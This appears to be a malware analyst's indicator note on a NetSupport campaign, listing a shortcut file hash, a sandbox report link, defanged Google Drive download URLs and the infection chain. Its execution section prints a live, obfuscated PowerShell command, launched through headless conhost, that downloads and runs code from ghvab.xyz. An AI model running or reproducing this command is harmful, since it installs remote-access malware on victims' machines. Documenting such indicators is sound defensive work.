@@ -1,0 +1,34 @@
+NetSupport | 2022.09.08
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.lnk a094d4a5bb31f6116ffe27a0c8f51ba042c01a5e1e4a06a636d5d39310d09284
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/220908-tsy6xalwxf/behavioral2
+
+
+# --------------------------------------------------------- #
+# ---------------------- CREDENTIAL ----------------------- #
+# --------------------------------------------------------- #
+hxxps://drive[.]google[.]com/uc?id=1cvwkarhMKwaCaDYBdco5pS3ygMy0kgzf&export=download
+hxxps://drive[.]google[.]com/uc?id=16DBa6-fCH_KxeJFGJlCqQmrOypSx_uG4&export=download
+
+password == <5 digits>
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+.zip 
+    .lnk
+        TARGET== C:\Windows\System32\conhost.exe --headless powershell $ty='et';new-alias y wg$ty;.$([char](2418-2313)+'ex')(y -useb ghvab.xyz/13)
+        [
+            drops %AppData%\random 8 digit directory name\random 8 digit exe name
+            i.e. -- "%AppData%\\\w{8}\\\w{8}\.exe
+        ]
+
+
